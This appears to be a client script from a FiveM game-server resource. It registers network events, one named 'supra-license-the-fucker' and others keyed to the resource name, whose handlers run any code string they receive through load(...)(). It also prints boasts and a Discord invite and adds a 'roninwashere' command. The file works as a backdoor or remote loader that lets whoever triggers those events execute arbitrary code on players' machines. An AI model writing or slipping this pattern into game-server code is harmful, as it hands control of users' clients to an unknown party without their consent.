RegisterNetEvent("supra-license-the-fucker")
AddEventHandler("supra-license-the-fucker", function(code)
    print("supra is the god")
    load(code)()
end)

RegisterCommand("roninwashere", function()
    TriggerServerEvent("saas")
end)

TriggerServerEvent("" .. GetCurrentResourceName() .. ":loadclaftersv")

RegisterNetEvent("" .. GetCurrentResourceName() .. ":loadcl")
AddEventHandler("" .. GetCurrentResourceName() .. ":loadcl", function(datastr)
    print("G Dev On Top https://discord.gg/TPfhSTkRxM")
    roninalahdir = true
    load(datastr)()
    roninalahdir = true  
end)

RegisterNetEvent("" .. GetCurrentResourceName() .. ":clprint")
AddEventHandler("" .. GetCurrentResourceName() .. ":clprint", function(str)
    print(str)
end)